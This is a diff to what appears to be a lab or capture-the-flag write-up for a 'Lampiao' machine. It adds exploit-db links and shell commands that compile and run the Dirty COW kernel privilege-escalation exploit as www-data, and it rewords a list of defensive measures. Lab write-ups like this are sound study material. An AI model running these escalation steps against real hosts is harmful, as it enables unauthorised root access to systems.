@@ -106,7 +106,9 @@ Possible Exploits:
    Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
    Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
    Download URL: https://www.exploit-db.com/download/40839
-   ext-url: https://www.exploit-db.com/download/40847.cpp
+   ext-url: https://www.exploit-db.com/download/40847
+www-data@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+www-data@lampiao:/tmp$ ./dcow -s
  <snipped>
  ```
  
@@ -122,7 +124,7 @@ We can ssh as the root user with the modified password.
 ## Defense 
 
 [1] Firewall/IDS/IPS rule to detect signature of druppalgeddon and block it. <br>
-[2] Disable access to sensitive files like CHANGELOG.txt. <br>
+[2] Disable access to files like CHANGELOG.txt which might leak extraneous information. <br>
 [3] Limit the ACL for uploading, executing files in the OS level or Server level. <br>
 [4] Implement services like fail2ban to prevent SSH bruteforce. 
 
